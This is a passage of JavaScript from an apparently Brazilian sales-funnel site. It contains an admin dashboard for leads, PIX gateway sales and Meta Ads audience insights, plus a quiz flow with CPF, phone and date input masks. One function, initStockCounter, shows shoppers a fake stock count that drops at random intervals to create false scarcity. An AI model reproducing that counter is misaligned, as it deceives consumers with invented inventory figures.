        if (publicAudienceConfidence) publicAudienceConfidence.textContent = `Confiança: ${audience.confidence || '-'}`;
        publicAudienceResult.innerHTML = `
            <article class="public-audience-card public-audience-card--hero">
                <span>Nome do público</span>
                <strong>${escapeHtml(audience.name || 'Público ideal')}</strong>
                <em>${Number(audience.totalPaid || 0)} compradores pagos | ${escapeHtml(formatCurrency(Number(audience.totalRevenue || 0)))}</em>
            </article>
            <div class="public-audience-grid">
                <article class="public-audience-card">
                    <span>Configuração no Meta Ads</span>
                    <strong>${escapeHtml(setup.objective || 'Vendas')}</strong>
                    <p>Local da conversão: ${escapeHtml(setup.conversionLocation || 'Site')}</p>
                    <p>Modo: ${escapeHtml(setup.audienceMode || 'Advantage+ audience')}</p>
                    <p>Gênero: ${escapeHtml(setup.gender || 'Todos')} | Idioma: ${escapeHtml(setup.language || 'Português (Brasil)')}</p>
                </article>
                <article class="public-audience-card">
                    <span>Idade campeã e dispositivo</span>
                    <strong>${escapeHtml(setup?.age?.label || '18-65+')}</strong>
                    ${ageWinner ? `<p>Idade exata que mais faturou: <b>${escapeHtml(ageWinner.label || '-')}</b> | ${escapeHtml(formatCurrency(Number(ageWinner.amount || 0)))} | ${Number(ageWinner.count || 0)} vendas</p>` : ''}
                    <p>${escapeHtml(setup?.age?.note || '')}</p>
                    <p>Dispositivo: ${escapeHtml(setup.device || 'Todos')}</p>
                </article>
                <article class="public-audience-card">
                    <span>Localização</span>
                    <strong>${escapeHtml((setup.locations || ['Brasil']).join(', '))}</strong>
                    <div class="public-audience-stack">${renderPublicAudienceList(evidence.locations || [], 'Sem cidade salva.')}</div>
                </article>
                <article class="public-audience-card">
                    <span>Posicionamentos</span>
                    <strong>${escapeHtml(placements)}</strong>
                    <p>${escapeHtml(setup.placementStrategy || '')}</p>
                    <div class="public-audience-stack">${renderPublicAudienceList(evidence.positionings || [], 'Sem UTM term salvo.')}</div>
                </article>
                <article class="public-audience-card">
                    <span>Detalhamento sugerido</span>
                    <strong>${escapeHtml((setup.detailedTargeting || []).join(', ') || 'Amplo')}</strong>
                    <p>${escapeHtml(setup.customAudience || '')}</p>
                </article>
                <article class="public-audience-card">
                    <span>Provas usadas</span>
                    <div class="public-audience-stack">
                        <span>Idades por faturamento: ${renderPublicAudienceList(evidence.exactAges || [], 'sem nascimento suficiente')}</span>
                        <span>Faixas Meta: ${renderPublicAudienceList(evidence.ages || [], 'sem faixa suficiente')}</span>
                        <span>Dispositivos: ${renderPublicAudienceList(evidence.devices || [], 'sem user agent')}</span>
                        <span>CEPs: ${renderPublicAudienceList(evidence.cepPrefixes || [], 'sem CEP suficiente')}</span>
                    </div>
                </article>
            </div>
            <div class="public-audience-warnings">
                <strong>Dados ignorados por falta de campo</strong>
                <span>Nascimento: ${Number(missing.birth || 0)} | Cidade: ${Number(missing.city || 0)} | CEP: ${Number(missing.cep || 0)} | Posicionamento: ${Number(missing.positioning || 0)} | Dispositivo: ${Number(missing.device || 0)}</span>
            </div>
            <div class="public-audience-notes">
                ${notes.map((note) => `<span>${escapeHtml(note)}</span>`).join('')}
            </div>
        `;
    };

    const loadSalesInsights = async ({ manual = false } = {}) => {
        if (!wantsSalesInsights) return;

        const url = new URL('/api/admin/sales-insights', window.location.origin);
        const activeRange = getActiveOverviewRange();
        const forceAllPaidAudience = manual && adminPage === 'public';
        if (!forceAllPaidAudience && activeRange.from) url.searchParams.set('from', activeRange.from);
        if (!forceAllPaidAudience && activeRange.to) url.searchParams.set('to', activeRange.to);
        url.searchParams.set('max', '80000');

        if (manual && publicAudienceBuild) publicAudienceBuild.disabled = true;
        if (manual && publicAudienceStatus) publicAudienceStatus.textContent = 'Lendo todos os compradores pagos e calculando público ideal...';

        let res;
        let payload = {};
        try {
            res = await adminFetch(url.toString());
            payload = await res.json().catch(() => ({}));
        } finally {
            if (manual && publicAudienceBuild) publicAudienceBuild.disabled = false;
        }
        if (!res.ok || payload?.ok === false) {
            renderSalesWinner(salesPositioningWinner, salesPositioningDetail, salesTopPositioningLabel, null);
            renderSalesWinner(salesCityWinner, salesCityDetail, salesTopCityLabel, null);
            renderSalesWinner(salesDeviceWinner, salesDeviceDetail, salesTopDeviceLabel, null);
            renderSalesRankingList(salesPositioningList, [], payload?.error || 'Sem dados de posicionamento.');
            renderSalesRankingList(salesCityList, [], payload?.error || 'Sem dados de cidade.');
            renderSalesRankingList(salesDeviceList, [], payload?.error || 'Sem dados de aparelho.');
            if (salesBase) salesBase.textContent = 'Base: 0 vendas';
            if (salesPaidTotal) salesPaidTotal.textContent = '0';
            if (salesRevenueTotal) salesRevenueTotal.textContent = formatCurrency(0);
            if (salesUpdated) salesUpdated.textContent = '-';
            if (overviewRangeStatus && hasOverviewRangeControls) {
                overviewRangeStatus.textContent = payload?.error || 'Falha ao carregar periodo selecionado.';
            }
            if (manual && publicAudienceStatus) publicAudienceStatus.textContent = payload?.error || 'Falha ao calcular público ideal.';
            if (manual) renderPublicAudience(null);
            return;
        }

        const summary = payload?.summary || {};
        const data = payload?.data || {};
        const totalPaid = Number(summary?.totalPaid || 0);
        const totalRevenue = Number(summary?.totalRevenue || 0);

        if (salesBase) {
            salesBase.textContent = summary?.truncated
                ? `Base: ${totalPaid} vendas (amostra)`
                : `Base: ${totalPaid} vendas`;
        }
        if (salesPaidTotal) salesPaidTotal.textContent = String(totalPaid);
        if (salesRevenueTotal) salesRevenueTotal.textContent = formatCurrency(totalRevenue);
        if (salesUpdated) salesUpdated.textContent = formatDateTime(summary?.lastSaleAt);

        renderSalesWinner(salesPositioningWinner, salesPositioningDetail, salesTopPositioningLabel, summary?.topPositioning || null);
        renderSalesWinner(salesCityWinner, salesCityDetail, salesTopCityLabel, summary?.topCity || null);
        renderSalesWinner(salesDeviceWinner, salesDeviceDetail, salesTopDeviceLabel, summary?.topDevice || null);

        renderSalesRankingList(salesPositioningList, data?.positionings || [], 'Nenhuma venda com posicionamento identificado nesse periodo.');
        renderSalesRankingList(salesCityList, data?.cities || [], 'Nenhuma venda com cidade identificada nesse periodo.');
        renderSalesRankingList(salesDeviceList, data?.devices || [], 'Nenhuma venda com aparelho identificado nesse periodo.');
        renderPublicAudience(payload?.audience || null);

        if (overviewRangeStatus && hasOverviewRangeControls) {
            overviewRangeStatus.textContent = forceAllPaidAudience
                ? 'Período: todos os compradores pagos'
                : describeOverviewRange({
                    preset: overviewRange.preset,
                    from: activeRange.from || '',
                    to: activeRange.to || ''
                });
        }
        if (manual && publicAudienceStatus) {
            publicAudienceStatus.textContent = `Cálculo finalizado com ${totalPaid} compradores pagos.`;
        }
    };

    const renderGatewaySalesCards = (summary = []) => {
        if (!gatewaySalesGrid) return;
        const rows = Array.isArray(summary) ? summary : [];
        if (!rows.length) {
            gatewaySalesGrid.innerHTML = '<div class="sales-ranking-empty">Sem vendas pagas no periodo.</div>';
            return;
        }

        gatewaySalesGrid.innerHTML = rows.map((item) => {
            const gateway = String(item?.gateway || '').trim();
            const active = gateway && gateway === gatewaySalesState.selectedGateway;
            return `
                <button class="gateway-sales-card${active ? ' is-active' : ''}" type="button" data-gateway-sales-card="${escapeHtml(gateway)}">
                    <div class="gateway-sales-card__top">
                        <strong>${escapeHtml(item?.gatewayLabel || gateway || '-')}</strong>
                        <span>${Number(item?.salesCount || 0)} vendas</span>
                    </div>
                    <div class="gateway-sales-card__value">${escapeHtml(formatCurrency(Number(item?.grossRevenue || 0)))}</div>
                    <div class="gateway-sales-card__meta">
                        <span>Ultimo pago</span>
                        <b>${escapeHtml(formatDateTime(item?.lastPaidAt) || '-')}</b>
                    </div>
                </button>
            `;
        }).join('');
    };

    const renderGatewaySalesTable = (items = []) => {
        if (!gatewaySalesBody) return;
        const rows = Array.isArray(items) ? items : [];
        if (!rows.length) {
            gatewaySalesBody.innerHTML = '<tr><td colspan="6" class="admin-muted">Nenhuma venda encontrada para esse filtro.</td></tr>';
            return;
        }

        gatewaySalesBody.innerHTML = rows.map((item) => {
            const leadName = String(item?.lead?.name || '-').trim() || '-';
            const leadMeta = [
                String(item?.lead?.email || '').trim(),
                String(item?.lead?.cpf || '').trim(),
                String(item?.sessionId || '').trim() ? `Sessao ${String(item.sessionId).trim()}` : ''
            ].filter(Boolean);
            const offerMeta = [
                String(item?.stepLabel || '').trim(),
                String(item?.shippingName || '').trim(),
                String(item?.journey?.label || '').trim() ? `Jornada ${String(item.journey.label).trim()}` : ''
            ].filter(Boolean);
            const campaignMeta = [
                String(item?.utm?.source || '').trim(),
                String(item?.utm?.campaign || '').trim(),
                String(item?.utm?.term || '').trim()
            ].filter((value) => value && value !== '-');

            return `
                <tr>
                    <td>
                        <div class="gateway-sales-cell">
                            <strong>${escapeHtml(formatDateTime(item?.paidAt) || '-')}</strong>
                            <span>${escapeHtml(formatDateTime(item?.createdAt) || '-')}</span>
                        </div>
                    </td>
                    <td>
                        <div class="gateway-sales-cell">
                            <strong>${escapeHtml(leadName)}</strong>
                            <span>${escapeHtml(leadMeta.join(' | ') || '-')}</span>
                        </div>
                    </td>
                    <td>
                        <div class="gateway-sales-cell">
                            <strong>${escapeHtml(item?.offerLabel || '-')}</strong>
                            <span>${escapeHtml(offerMeta.join(' | ') || '-')}</span>
                        </div>
                    </td>
                    <td>
                        <div class="gateway-sales-cell">
                            <strong>${escapeHtml(item?.gatewayLabel || '-')}</strong>
                            <span>${escapeHtml(campaignMeta.join(' | ') || '-')}</span>
                        </div>
                    </td>
                    <td class="gateway-sales-cell gateway-sales-cell--mono">
                        <strong>${escapeHtml(item?.txid || '-')}</strong>
                    </td>
                    <td>
                        <div class="gateway-sales-cell gateway-sales-cell--value">
                            <strong>${escapeHtml(formatCurrency(Number(item?.amount || 0)))}</strong>
                        </div>
                    </td>
                </tr>
            `;
        }).join('');
    };

    const loadGatewaySales = async ({ keepSelection = false } = {}) => {
        if (!wantsGatewaySales || gatewaySalesState.loading) return;
        gatewaySalesState.loading = true;
        if (gatewaySalesStatus) gatewaySalesStatus.textContent = 'Carregando vendas por gateway...';

        const url = new URL('/api/admin/gateway-sales', window.location.origin);
        const activeRange = getActiveOverviewRange();
        const exactRange = buildDateInputLocalExactRange(activeRange.from, activeRange.to);
        if (exactRange.fromIsoExact) url.searchParams.set('fromIsoExact', exactRange.fromIsoExact);
        else if (activeRange.from) url.searchParams.set('from', activeRange.from);
        if (exactRange.toIsoExact) url.searchParams.set('toIsoExact', exactRange.toIsoExact);
        else if (activeRange.to) url.searchParams.set('to', activeRange.to);
        if (gatewaySalesState.selectedGateway) url.searchParams.set('gateway', gatewaySalesState.selectedGateway);
        if (gatewaySalesState.query) url.searchParams.set('q', gatewaySalesState.query);
        url.searchParams.set('max', '80000');

        const res = await adminFetch(url.toString());
        const payload = await res.json().catch(() => ({}));
        gatewaySalesState.loading = false;

        if (!res.ok || payload?.ok === false) {
            renderGatewaySalesCards([]);
            renderGatewaySalesTable([]);
            if (gatewaySalesBase) gatewaySalesBase.textContent = 'Base: 0 vendas';
            if (gatewaySalesUpdated) gatewaySalesUpdated.textContent = '-';
            if (gatewaySalesTopGateway) gatewaySalesTopGateway.textContent = '-';
            if (gatewaySalesCurrentFilter) gatewaySalesCurrentFilter.textContent = gatewaySalesState.selectedGateway ? gatewayLabelForUi(gatewaySalesState.selectedGateway) : 'Todos';
            if (gatewaySalesTotalRevenue) gatewaySalesTotalRevenue.textContent = formatCurrency(0);
            if (gatewaySalesTotalCount) gatewaySalesTotalCount.textContent = '0 vendas';
            if (gatewaySalesDetailRevenue) gatewaySalesDetailRevenue.textContent = formatCurrency(0);
            if (gatewaySalesDetailCount) gatewaySalesDetailCount.textContent = '0 vendas';
            if (gatewaySalesSelectedChip) gatewaySalesSelectedChip.textContent = gatewaySalesState.selectedGateway ? gatewayLabelForUi(gatewaySalesState.selectedGateway) : 'Todos';
            if (gatewaySalesStatus) gatewaySalesStatus.textContent = payload?.error || 'Falha ao carregar vendas por gateway.';
            return;
        }

        const summary = Array.isArray(payload?.summary) ? payload.summary : [];
        const meta = payload?.meta || {};
        const detail = payload?.detail || {};
        const items = Array.isArray(payload?.items) ? payload.items : [];
        if (!gatewaySalesState.selectedGateway && !keepSelection && summary[0]?.gateway) {
            gatewaySalesState.selectedGateway = String(summary[0].gateway || '').trim();
            return loadGatewaySales({ keepSelection: true });
        }

        renderGatewaySalesCards(summary);
        renderGatewaySalesTable(items);

        if (gatewaySalesBase) {
            gatewaySalesBase.textContent = meta?.truncated
                ? `Base: ${Number(meta?.totalSales || 0)} vendas (amostra)`
                : `Base: ${Number(meta?.totalSales || 0)} vendas`;
        }
        if (gatewaySalesUpdated) gatewaySalesUpdated.textContent = formatDateTime(meta?.lastPaidAt);
        if (gatewaySalesTopGateway) gatewaySalesTopGateway.textContent = summary[0]?.gatewayLabel || '-';
        if (gatewaySalesCurrentFilter) gatewaySalesCurrentFilter.textContent = detail?.gatewayLabel || 'Todos';
        if (gatewaySalesTotalRevenue) gatewaySalesTotalRevenue.textContent = formatCurrency(Number(meta?.totalGrossRevenue || 0));
        if (gatewaySalesTotalCount) gatewaySalesTotalCount.textContent = `${Number(meta?.totalSales || 0)} vendas`;
        if (gatewaySalesSelectedChip) gatewaySalesSelectedChip.textContent = detail?.gatewayLabel || 'Todos';
        if (gatewaySalesDetailRevenue) gatewaySalesDetailRevenue.textContent = formatCurrency(Number(detail?.totalGrossRevenue || 0));
        if (gatewaySalesDetailCount) gatewaySalesDetailCount.textContent = `${Number(detail?.totalSales || 0)} vendas`;
        if (gatewaySalesStatus) {
            const parts = [];
            if (detail?.gatewayLabel) parts.push(`Mostrando ${detail.gatewayLabel}`);
            else parts.push('Mostrando todos os gateways');
            if (detail?.query) parts.push(`busca: ${detail.query}`);
            gatewaySalesStatus.textContent = parts.join(' | ');
        }

        if (overviewRangeStatus && hasOverviewRangeControls) {
            overviewRangeStatus.textContent = describeOverviewRange({
                preset: overviewRange.preset,
                from: activeRange.from || '',
                to: activeRange.to || ''
            });
        }
    };

    leadsBody?.addEventListener('click', (event) => {
        const row = event.target?.closest?.('tr[data-session-id]');
        if (!row) return;
        openLeadDetail(row.getAttribute('data-session-id') || '');
    });
    leadsBody?.addEventListener('keydown', (event) => {
        if (event.key !== 'Enter' && event.key !== ' ') return;
        const row = event.target?.closest?.('tr[data-session-id]');
        if (!row) return;
        event.preventDefault();
        openLeadDetail(row.getAttribute('data-session-id') || '');
    });
    ipBlacklistBody?.addEventListener('click', async (event) => {
        const button = event.target?.closest?.('[data-remove-block-ip]');
        if (!button) return;
        const ip = button.getAttribute('data-remove-block-ip') || '';
        if (!ip) return;
        const confirmed = window.confirm(`Tem certeza que deseja remover o bloqueio do IP ${ip}?`);
        if (!confirmed) return;
        await removeBlockedIp(ip);
    });
    leadDetailClose?.addEventListener('click', closeLeadDetailModal);
    leadDetailModal?.addEventListener('click', (event) => {
        if (event.target === leadDetailModal) {
            closeLeadDetailModal();
        }
    });
    leadDetailCopyPayload?.addEventListener('click', async () => {
        const text = String(leadDetailPayload?.textContent || '').trim();
        if (!text) return;
        try {
            await navigator.clipboard.writeText(text);
            showToast('Payload copiado.', 'success');
        } catch (_error) {
            showToast('Nao foi possivel copiar o payload.', 'error');
        }
    });
    gatewayTestBtn?.addEventListener('click', openGatewayTestModal);
    gatewayTestClose?.addEventListener('click', closeGatewayTestModal);
    gatewayTestReset?.addEventListener('click', resetGatewayTestResults);
    gatewayTestGenerate?.addEventListener('click', runGatewayTests);
    ensureSettingsRetryModal().retryBtn?.addEventListener('click', async () => {
        const refs = ensureSettingsRetryModal();
        if (refs.retryBtn) {
            refs.retryBtn.disabled = true;
            refs.retryBtn.textContent = 'Tentando...';
        }
        await loadSettings();
        if (refs.retryBtn) {
            refs.retryBtn.disabled = false;
            refs.retryBtn.textContent = 'Tentar novamente';
        }
    });
    gatewayTestModal?.addEventListener('click', (event) => {
        if (event.target === gatewayTestModal) {
            closeGatewayTestModal();
        }
    });
    gatewayTestResults?.addEventListener('click', async (event) => {
        const button = event.target?.closest?.('[data-gateway-test-copy]');
        if (!button) return;
        const code = String(button.getAttribute('data-gateway-test-copy') || '').trim();
        if (!code) return;
        try {
            await navigator.clipboard.writeText(code);
        } catch (_error) {
            const input = button.parentElement?.querySelector('input');
            input?.select?.();
            document.execCommand('copy');
        }
        showToast('Codigo PIX copiado.', 'success');
    });
    gatewaySalesGrid?.addEventListener('click', (event) => {
        const card = event.target?.closest?.('[data-gateway-sales-card]');
        if (!card) return;
        const gateway = String(card.getAttribute('data-gateway-sales-card') || '').trim();
        if (!gateway) return;
        gatewaySalesState.selectedGateway = gateway;
        loadGatewaySales({ keepSelection: true });
    });
    let gatewaySalesSearchDebounce = 0;
    gatewaySalesSearch?.addEventListener('input', () => {
        window.clearTimeout(gatewaySalesSearchDebounce);
        gatewaySalesSearchDebounce = window.setTimeout(() => {
            gatewaySalesState.query = String(gatewaySalesSearch.value || '').trim();
            loadGatewaySales({ keepSelection: true });
        }, 220);
    });
    gatewaySalesSearch?.addEventListener('keydown', (event) => {
        if (event.key !== 'Enter') return;
        event.preventDefault();
        window.clearTimeout(gatewaySalesSearchDebounce);
        gatewaySalesState.query = String(gatewaySalesSearch.value || '').trim();
        loadGatewaySales({ keepSelection: true });
    });
    leadDetailLookupBtn?.addEventListener('click', consultLeadTransaction);
    leadDetailBlockBtn?.addEventListener('click', blockCurrentLeadIp);
    leadDetailUnblockBtn?.addEventListener('click', async () => {
        const ip = String(currentLeadDetail?.device?.clientIp || '').trim();
        if (!ip) return;
        const confirmed = window.confirm(`Tem certeza que deseja remover o bloqueio do IP ${ip}?`);
        if (!confirmed) return;
        await removeBlockedIp(ip);
    });
    document.addEventListener('keydown', (event) => {
        if (event.key === 'Escape' && leadDetailModal && !leadDetailModal.classList.contains('hidden')) {
            closeLeadDetailModal();
            return;
        }
        if (event.key === 'Escape' && gatewayTestModal && !gatewayTestModal.classList.contains('hidden')) {
            closeGatewayTestModal();
        }
    });

    loginBtn?.addEventListener('click', async () => {
        if (loginError) loginError.classList.add('hidden');
        const password = passwordInput?.value || '';
        const res = await adminFetch('/api/admin/login', {
            method: 'POST',
            body: JSON.stringify({ password })
        });
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            if (loginError) {
                loginError.textContent = detail?.error || 'Senha invalida.';
                loginError.classList.remove('hidden');
            }
            return;
        }
        setLoginVisible(false);
        if (hasPixelForm || hasUtmfyForm || hasPaymentsForm || hasFeatureForm) await loadSettings();
        if (wantsLeads) await loadLeads({ reset: true });
        if (ipBlacklistBody) await loadIpBlacklist();
        if (wantsPages) await loadPageCounts();
        if (shouldAutoLoadSalesInsights) await loadSalesInsights();
        if (wantsGatewaySales) await loadGatewaySales();
        if (wantsBackredirects) await loadBackredirects();
        if (wantsCloners) await loadCloners();
    });

    saveBtn?.addEventListener('click', saveSettings);
    clonersRefresh?.addEventListener('click', loadCloners);
    leadsRefresh?.addEventListener('click', () => loadLeads({ reset: true }));
    leadsMore?.addEventListener('click', () => loadLeads({ reset: false }));
    leadsSearch?.addEventListener('input', () => {
        window.clearTimeout(leadsSearchDebounce);
        leadsSearchDebounce = window.setTimeout(() => {
            loadLeads({ reset: true });
        }, 220);
    });
    leadsSearch?.addEventListener('keydown', (event) => {
        if (event.key !== 'Enter') return;
        event.preventDefault();
        window.clearTimeout(leadsSearchDebounce);
        loadLeads({ reset: true });
    });
    leadsSearch?.addEventListener('change', () => {
        window.clearTimeout(leadsSearchDebounce);
        loadLeads({ reset: true });
    });
    leadsExport?.addEventListener('click', exportLeads);
    publicAudienceBuild?.addEventListener('click', () => {
        loadSalesInsights({ manual: true });
    });
    overviewRangePreset?.addEventListener('change', async () => {
        const selected = String(overviewRangePreset.value || 'all');
        if (selected === 'custom') {
            overviewRange = {
                preset: 'custom',
                from: String(overviewRangeFrom?.value || '').trim(),
                to: String(overviewRangeTo?.value || '').trim()
            };
            syncOverviewRangeUi();
            saveOverviewRange();
            return;
        }
        overviewRange = buildPresetRange(selected);
        syncOverviewRangeUi();
        saveOverviewRange();
        if (wantsLeads) await loadLeads({ reset: true });
        if (shouldAutoLoadSalesInsights) await loadSalesInsights();
        if (wantsGatewaySales) await loadGatewaySales({ keepSelection: true });
    });
    overviewRangeApply?.addEventListener('click', () => {
        applyOverviewRangeAndReload();
    });
    overviewRangeReset?.addEventListener('click', async () => {
        overviewRange = { preset: 'all', from: '', to: '' };
        syncOverviewRangeUi();
        saveOverviewRange();
        if (wantsLeads) await loadLeads({ reset: true });
        if (shouldAutoLoadSalesInsights) await loadSalesInsights();
        if (wantsGatewaySales) await loadGatewaySales({ keepSelection: true });
    });
    overviewRangeFrom?.addEventListener('change', () => {
        if (overviewRange.preset !== 'custom') return;
        overviewRange.from = String(overviewRangeFrom?.value || '').trim();
        saveOverviewRange();
        syncOverviewRangeUi();
    });
    overviewRangeTo?.addEventListener('change', () => {
        if (overviewRange.preset !== 'custom') return;
        overviewRange.to = String(overviewRangeTo?.value || '').trim();
        saveOverviewRange();
        syncOverviewRangeUi();
    });
    leadsReconcile?.addEventListener('click', reconcilePix);
    testPixelBtn?.addEventListener('click', runPixelTest);
    testTikTokPixelBtn?.addEventListener('click', runTikTokPixelTest);
    testUtmfyBtn?.addEventListener('click', runUtmfyTest);
    saleUtmfyBtn?.addEventListener('click', runUtmfySale);
    testPushcutBtn?.addEventListener('click', runPushcutTest);
    processDispatchBtn?.addEventListener('click', runDispatchProcess);
    paymentsActiveGateway?.addEventListener('change', () => {
        const selected = getPrimaryGatewayFromUi();
        setCurrentGatewayCard(selected);
        setGatewayCardOpen(selected, true);
        syncGatewayOrderMeta();
        if (metricActiveGateway) {
            metricActiveGateway.textContent = gatewayLabelForUi(selected);
        }
    });
    gatewayGhostspayEnabled?.addEventListener('change', syncGatewaySwitches);
    gatewaySunizeEnabled?.addEventListener('change', syncGatewaySwitches);
    gatewayParadiseEnabled?.addEventListener('change', syncGatewaySwitches);
    gatewayAtomopayEnabled?.addEventListener('change', syncGatewaySwitches);
    gatewayConfigToggles.forEach((button) => {
        button.addEventListener('click', () => {
            const gateway = button.getAttribute('data-gateway-config-toggle') || 'ghostspay';
            toggleGatewayCard(gateway);
        });
    });

    navItems.forEach((item) => {
        const itemPage = item.getAttribute('data-admin');
        if (itemPage && itemPage === adminPage) {
            item.classList.add('is-active');
        }
        item.addEventListener('click', (event) => {
            const target = item.getAttribute('data-target');
            if (!target) return;
            event.preventDefault();
            navItems.forEach((btn) => btn.classList.remove('is-active'));
            item.classList.add('is-active');
            const section = document.getElementById(target);
            if (section) section.scrollIntoView({ behavior: 'smooth', block: 'start' });
        });
    });

    if (hasPaymentsForm) {
        initializeGatewayOrderControls();
        const selected = getPrimaryGatewayFromUi();
        syncGatewaySwitches();
        syncGatewayOrderMeta();
        setCurrentGatewayCard(selected);
        setGatewayCardOpen(selected, true);
    }
    initializeOverviewRange();

    checkAuth().then((ok) => {
        if (ok) {
            setLoginVisible(false);
            if (hasPixelForm || hasUtmfyForm || hasPaymentsForm || hasFeatureForm) loadSettings();
            if (wantsLeads) loadLeads({ reset: true });
            if (ipBlacklistBody) loadIpBlacklist();
            if (wantsPages) loadPageCounts();
            if (shouldAutoLoadSalesInsights) loadSalesInsights();
            if (wantsGatewaySales) loadGatewaySales();
            if (wantsBackredirects) loadBackredirects();
            if (wantsCloners) loadCloners();
            // Keep overview fresh without manual reload.
            const refreshIntervalMs = 10000;
            setInterval(() => {
                if (document.visibilityState !== 'visible') return;
                if (wantsLeads) loadLeads({ reset: true });
                if (wantsPages) loadPageCounts();
                if (shouldAutoLoadSalesInsights) loadSalesInsights();
                if (wantsGatewaySales) loadGatewaySales({ keepSelection: true });
                if (wantsBackredirects) loadBackredirects();
                if (wantsCloners) loadCloners();
            }, refreshIntervalMs);
        } else {
            setLoginVisible(true);
        }
    });
}

function renderQuestion(questionConfig, refs) {
    const { questionText, optionsContainer, questionCount, progressFill } = refs;

    questionText.innerText = questionConfig.text;
    optionsContainer.innerHTML = '';

    questionConfig.options.forEach((opt) => {
        const btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'option-btn';
        btn.innerHTML = `<span class="icon">${opt.icon}</span> ${opt.text}`;
        btn.addEventListener('click', () => handleAnswer(btn, opt, refs));
        optionsContainer.appendChild(btn);
    });

    updateProgress(questionCount, progressFill);
}

function handleAnswer(btnElement, option, refs) {
    if (state.answerLocked) return;
    state.answerLocked = true;

    const allBtns = document.querySelectorAll('.option-btn');
    allBtns.forEach((b) => {
        b.classList.remove('selected');
        b.disabled = true;
    });

    btnElement.classList.add('selected');

    setTimeout(() => {
        if (option.next === 'personal_step') {
            saveQuizComplete();
            setStage('personal');
            redirect('dados.html');
            return;
        }

        state.currentStepIndex += 1;
        state.currentQuestionKey = option.next;
        state.totalSteps = Math.max(
            state.currentStepIndex,
            (state.currentStepIndex - 1) + maxPathLengthFrom(state.currentQuestionKey)
        );

        if (!questions[state.currentQuestionKey]) {
            showToast('Ocorreu um erro ao carregar a próxima pergunta.', 'error');
            state.answerLocked = false;
            return;
        }

        renderQuestion(questions[state.currentQuestionKey], refs);
        state.answerLocked = false;
    }, 300);
}

function updateProgress(questionCount, progressFill) {
    const total = Math.max(state.totalSteps, state.currentStepIndex);
    questionCount.innerText = `PERGUNTA ${state.currentStepIndex} DE ${total}`;
    const progressPct = (state.currentStepIndex / total) * 100;
    progressFill.style.width = `${Math.min(progressPct, 100)}%`;
}

function maxPathLengthFrom(key) {
    if (!key || key === 'personal_step') return 0;
    if (pathMemo[key]) return pathMemo[key];
    const q = questions[key];
    if (!q || !Array.isArray(q.options) || q.options.length === 0) return 0;
    const maxNext = Math.max(...q.options.map((opt) => maxPathLengthFrom(opt.next)));
    const length = 1 + (Number.isFinite(maxNext) ? maxNext : 0);
    pathMemo[key] = length;
    return length;
}

function initStockCounter() {
    if (!dom.stockCounter) return;
    const stored = Number(sessionStorage.getItem(STORAGE_KEYS.stock) || 8);
    let stock = Number.isFinite(stored) && stored > 0 ? stored : 8;

    dom.stockCounter.innerText = stock;

    const tick = () => {
        if (stock > 3) {
            stock -= 1;
            sessionStorage.setItem(STORAGE_KEYS.stock, String(stock));
            dom.stockCounter.innerText = stock;
            dom.stockCounter.style.color = '#ffeb3b';
            setTimeout(() => {
                dom.stockCounter.style.color = 'white';
            }, 500);
            setTimeout(tick, Math.random() * 8000 + 4000);
        }
    };

    setTimeout(tick, 5000);
}

function maskCPF(input) {
    if (!input) return;
    let v = input.value.replace(/\D/g, '');
    if (v.length > 11) v = v.slice(0, 11);
    v = v.replace(/(\d{3})(\d)/, '$1.$2');
    v = v.replace(/(\d{3})(\d)/, '$1.$2');
    v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    input.value = v;
}

function maskDate(input) {
    if (!input) return;
    let v = input.value.replace(/\D/g, '');
    if (v.length > 8) v = v.slice(0, 8);
    v = v.replace(/(\d{2})(\d)/, '$1/$2');
    v = v.replace(/(\d{2})(\d)/, '$1/$2');
    input.value = v;
}

function maskPhone(input) {
    if (!input) return;
    let v = input.value.replace(/\D/g, '');
    if (v.length > 11) v = v.slice(0, 11);
    if (v.length <= 2) {
        input.value = v;
        return;
    }
    if (v.length <= 6) {
        input.value = `(${v.slice(0, 2)}) ${v.slice(2)}`;
        return;
    }
    if (v.length <= 10) {
        input.value = `(${v.slice(0, 2)}) ${v.slice(2, 6)}-${v.slice(6)}`;
        return;
    }
    input.value = `(${v.slice(0, 2)}) ${v.slice(2, 7)}-${v.slice(7)}`;
}

function maskCep(input) {
    if (!input) return;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 8) value = value.slice(0, 8);
    if (value.length > 5) {
        value = `${value.slice(0, 5)}-${value.slice(5)}`;
    }
    input.value = value;
}

function validateCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, '');
    if (!cpf || cpf.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(cpf)) return false;

    let add = 0;
    for (let i = 0; i < 9; i += 1) add += parseInt(cpf.charAt(i), 10) * (10 - i);
    let rev = 11 - (add % 11);
    if (rev === 10 || rev === 11) rev = 0;
    if (rev !== parseInt(cpf.charAt(9), 10)) return false;

    add = 0;
    for (let i = 0; i < 10; i += 1) add += parseInt(cpf.charAt(i), 10) * (11 - i);
    rev = 11 - (add % 11);
    if (rev === 10 || rev === 11) rev = 0;
    if (rev !== parseInt(cpf.charAt(10), 10)) return false;

    return true;
}

function isValidDate(value) {
    const match = value.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
    if (!match) return false;

    const day = parseInt(match[1], 10);
    const month = parseInt(match[2], 10);
    const year = parseInt(match[3], 10);

    const now = new Date();
    const currentYear = now.getFullYear();

    if (year < 1900 || year > currentYear) return false;

    const date = new Date(year, month - 1, day);
    if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) return false;
    if (date > now) return false;

    return true;
}

function isValidEmail(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
}

function isValidPhone(value) {
    const digits = value.replace(/\D/g, '');
    return digits.length >= 10 && digits.length <= 11;
}

function formatCep(rawCep) {
    if (!rawCep || rawCep.length !== 8) return rawCep || '-';
    return `${rawCep.slice(0, 5)}-${rawCep.slice(5)}`;
}

function formatCurrency(value) {
    return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).format(value);
}

function formatDateTime(value) {
    if (!value) return '-';
    const d = new Date(value);
    if (!Number.isNaN(d.getTime())) {
        return d.toLocaleString('pt-BR');
    }
    return String(value || '').trim() || '-';
}

function roundMoney(value) {
    return Math.round(Number(value || 0) * 100) / 100;
}

function saveCoupon(data) {
    localStorage.setItem(STORAGE_KEYS.coupon, JSON.stringify(data));
}

function loadCoupon() {
    try {
